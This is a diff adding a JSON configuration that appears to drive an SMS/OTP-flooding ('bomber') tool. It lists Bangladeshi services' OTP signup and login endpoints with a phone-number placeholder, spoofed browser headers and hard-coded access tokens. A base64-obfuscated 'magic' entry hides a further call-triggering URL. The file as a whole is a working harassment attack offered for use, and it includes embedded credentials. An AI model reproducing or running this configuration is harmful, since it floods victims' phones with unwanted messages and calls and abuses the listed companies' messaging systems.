@@ -1,1 +1,132 @@
+{
 
+    "contributors":[
+        
+    ],
+    
+    "apis":[
+         {
+            "method":"post",
+            "url" : "https://api.shikho.com/auth/v2/send/sms",
+            "payload" : {"phone":"{number}","type":"student","auth_type":"signup","vendor":"shikho"},
+            "headers":{
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+                "Origin": "https://shikho.com",
+                "Referer": "https://shikho.com/"
+            }
+        },
+        {
+            "method": "get",
+            "url":"https://web-api.binge.buzz/api/v3/otp/send/+88{number}",
+
+            "headers":{
+               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+               "Accept": "application/json, text/plain, */*",
+               "Accept-Language": "en-US,en;q=0.5",
+               "Accept-Encoding":"gzip, deflate, br",
+               "Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzQ3MjIwODcwLCJleHAiOjE3NDczOTM2NzB9.I7xXPybuLJ5xHSoY2THxm2Ciqog4Qi2fJXxSe7LIB3o",
+               "Device-Type": "web",
+               "Origin": "https://binge.buzz",
+               "Referer": "https://binge.buzz/",
+               "Sec-Fetch-Dest": "empty",
+               "Sec-Fetch-Mode": "cors",
+               "Sec-Fetch-Site": "same-site",
+               "Priority": "u=0",
+               "Te": "trailers",
+               "Connection": "close"
+            }
+        },
+        {
+            "method":"post",
+            "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
+            "payload":{"phone":"{number}"},
+            "headers":{
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+                "Content-Type": "application/json",
+                "Origin": "https://www.bioscopelive.com",
+                "Referer": "https://www.bioscopelive.com/"
+            }
+        },
+        {
+            "method":"post",
+            "url":"https://fundesh.com.bd/api/auth/generateOTP?service_key=",
+            "payload":{"msisdn":"{number}"},
+            "headers":{
+                "Content-Type": "application/json; charset=utf-8"
+            }
+
+        },
+        {
+            "method":"get",
+            "url":"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}",
+            "headers":{
+                
+                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+                    "Accept": "application/json, text/plain, */*",
+                    "Accept-Language": "bn",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Application-Name": "web",
+                    "Referer": "https://bikroy.com/?login-modal=true&redirect-url=/",
+                    "Sec-Fetch-Dest": "empty",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Site": "same-origin",
+                    "Priority": "u=0",
+                    "Te": "trailers"
+            }
+        },
+        {
+            "method":"post",
+            "url":"https://edge.ali2bd.com/api/consumer/v1/auth/login",
+            "payload":{"username":"+88{number}"},
+            "headers":{
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+                "Origin": "https://ali2bd.com",
+                "Referer": "https://ali2bd.com/"
+            }
+
+        },
+        {
+            "method":"get",
+            "url":"https://chinaonlinebd.com/api/login/verify-pin?phone={number}",
+            "headers":{
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Token": "45601f3d391886fcec5f5a3f26780f21",
+                "Referer": "https://chinaonlinebd.com/login?next=/dashboard",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin",
+                "Priority": "u=0",
+                "Te": "trailers"
+            }
+
+        },
+        {
+            "method":"post",
+            "url":"https://daktarbhai.com/login/mobile",
+            "payload":{"mobile":"{number}"},
+            "headers":{
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://daktarbhai.com/signin",
+                "Origin": "https://daktarbhai.com",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin",
+                "Priority": "u=0",
+                "Te": "trailers"
+            }
+        }
+        
+    ],
+
+    "magic":[
+        {
+            "jadu":"aHR0cHM6Ly9tcm4tYmlvLnNvY2lhbC1uZXR3b3JraW5nLm1lL1JpbmdNZS5waHA/YWN0aW9uPWNhbGxfYXBpJnBob25lPXtudW1iZXJ9JmFtb3VudD0x"
+        }
+    ]
+}
